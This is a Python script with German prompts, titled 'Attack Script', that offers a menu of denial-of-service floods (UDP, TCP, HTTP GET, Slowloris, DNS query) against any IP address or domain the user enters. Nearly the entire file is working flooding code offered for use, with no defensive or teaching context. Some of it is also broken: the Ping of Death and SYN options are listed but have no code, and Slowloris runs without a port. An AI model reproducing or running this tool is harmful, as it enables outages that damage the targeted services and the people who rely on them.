# -*- coding: utf-8 -*-
import os
import socket
import random
import requests
from datetime import datetime
import threading

# Begrüßung
os.system("clear")
os.system("figlet Attack Script")
print("Willkommen zum Angriffsskript!")
print("Bitte wählen Sie eine Angriffsmethode:")
print("1 - UDP Flood")
print("2 - TCP Flood")
print("3 - POD Flood (Ping of Death)")
print("4 - SYN Flood")
print("5 - HTTP GET Flood (rootfrei)")
print("6 - Slowloris Attack (rootfrei)")
print("7 - DNS Query Flood (rootfrei)")

# Auswahl der Methode
method = input("Wähle die Angriffsmethode (1/2/3/4/5/6/7): ")
ip = input("Ziel-IP-Adresse (oder Domain für HTTP/DNS): ")

# Port nur für bestimmte Methoden anfragen
port = None
if method in ["1", "2", "4"]:
    port = int(input("Port (z. B. 80): "))

# UDP Flood
if method == "1":
    print("Starte UDP-Flood...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(1490)
    sent = 0
    try:
        while True:
            sock.sendto(udp_bytes, (ip, port))
            sent += 1
            port = port + 1 if port < 65534 else 1
            print(f"Gesendet {sent} Pakete an {ip} über Port {port}")
    except KeyboardInterrupt:
        print("UDP-Flood beendet.")

# TCP Flood
elif method == "2":
    print("Starte TCP-Flood...")
    sent = 0
    try:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.settimeout(5)
                sock.connect((ip, port))
                sock.send(random._urandom(1024))
                sent += 1
                print(f"Gesendet {sent} TCP-Pakete an {ip} über Port {port}")
            except Exception as e:
                print(f"Verbindung fehlgeschlagen: {e}")
            finally:
                sock.close()
    except KeyboardInterrupt:
        print("TCP-Flood beendet.")

# HTTP GET Flood
elif method == "5":
    def http_get_flood(target):
        print("Starte HTTP GET Flood...")
        try:
            while True:
                response = requests.get(target)
                print(f"HTTP GET gesendet an {target} - Statuscode: {response.status_code}")
        except KeyboardInterrupt:
            print("HTTP GET Flood beendet.")
        except Exception as e:
            print(f"Fehler: {e}")

    target_url = f"http://{ip}"
    http_get_flood(target_url)

# Slowloris Attack
elif method == "6":
    def slowloris(ip, port):
        print("Starte Slowloris...")
        sockets = []
        try:
            for _ in range(100):  # Erstelle 100 Verbindungen
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((ip, port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sockets.append(sock)
                print(f"Verbindung {len(sockets)} offen gehalten.")
            while True:
                for sock in sockets:
                    sock.send(b"X-a: Keep-alive\r\n")  # Halte Verbindung offen
        except KeyboardInterrupt:
            print("Slowloris beendet.")
        except Exception as e:
            print(f"Fehler: {e}")

    slowloris(ip, port)

# DNS Query Flood
elif method == "7":
    def dns_flood(ip):
        print("Starte DNS Query Flood...")
        server = (ip, 53)  # Port 53 ist für DNS
        query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"  # DNS-Anfrage
        try:
            while True:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(query, server)
                print("DNS-Anfrage gesendet.")
        except KeyboardInterrupt:
            print("DNS Query Flood beendet.")
        except Exception as e:
            print(f"Fehler: {e}")

    dns_flood(ip)

else:
    print("Ungültige Auswahl. Das Programm wird beendet.")
